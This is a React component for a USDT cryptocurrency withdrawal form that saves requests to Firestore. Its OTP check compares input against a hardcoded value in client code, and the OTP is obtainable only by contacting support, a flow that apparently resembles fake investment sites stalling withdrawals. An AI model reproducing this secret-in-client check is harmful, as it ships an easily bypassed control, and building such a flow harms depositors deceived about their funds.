import { toast } from "react-toastify";
import "../../App.css";
import { useState } from "react";
import { db } from "../../server";
import { Timestamp, addDoc, collection } from "firebase/firestore";
import { useNavigate } from "react-router-dom";

const UserWithDrawF = () => {
  const [otp, setOtp] = useState("");
  const [address, setAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [loading, setLoading] = useState(false);

  const navigate = useNavigate()
  const reqOtp = () => {
    if (otp === "") {
      return toast.success("Please Contact Support for your OTP", {
        position: "bottom-left",
      });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      setLoading(true);
      const sendAt = Timestamp.now();
      if (amount < 10000) {
        toast.error("Amount is too Low", {
          position: "bottom-left",
        });
        setLoading(false);
        setAddress("");
        setAmount("");
        setOtp("");
        return;
      } else if (otp === "553456") {
        await addDoc(collection(db, "withdraw"), {
          otp,
          address,
          amount,
          sendAt,
        });

        toast.success(
          "Withdraw Request Successful, Your Funds will be deposited to your wallet, shortly",
          {
            position: "bottom-left",
          }
        );
        setLoading(false);
        setAddress("");
        setAmount(0);
        setOtp(0);
        navigate("/user/withdraw-success")
      } 
      else {
        toast.error("Please contact Support", {
          position: "bottom-left",
        });
        setLoading(false);
        setAddress("");
        setAmount("");
        setOtp("");
      }
      setLoading(false);
      setAddress("");
      setAmount("");
      setOtp("");
    } catch (err) {
      console.log(err);
    }
  };
  return (
    <div className="d-flex justify-content-center align-items-center flex-column py-5">
      <h3>Complete withdrawal request</h3>
      <div className="userwith-dash border border-success p-3 rounded">
        <h2>USDT</h2>
        <form onSubmit={handleSubmit}>
          <div className="d-flex flex-column gap-2 mb-3">
            <label>Enter Amount to Withdraw($)</label>
            <input
              type="number"
              placeholder="0"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              name=""
              id=""
              required
              className="w-100 rounded p-2"
            />
          </div>
          <div className="d-flex flex-column gap-2 mb-3">
            <div className="d-flex gap-3">
              <label>Enter OTP</label>
              <button
                className="btn btn-success"
                type="button"
                onClick={() => toast.info("Contact Support for your OTP", {position: "bottom-left"})}
              >
                Request OTP
              </button>
            </div>
            <input
              type="number"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              name=""
              placeholder="OTP"
              required
              id=""
              className="w-100 rounded p-2"
            />
          </div>
          <div className="d-flex flex-column gap-2 mb-3">
            <label>Enter USDT Address</label>
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              required
              className="w-100 rounded p-2"
            />
          </div>
          <p className="sm-txte">
            USDT is a default withdrawal option in your account, please
            enter the correct wallet address to receive your funds
          </p>
          <button type="submit" className="btn btn-success rounded">
            {loading ? "Submitting..." : "Complete Request"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default UserWithDrawF;
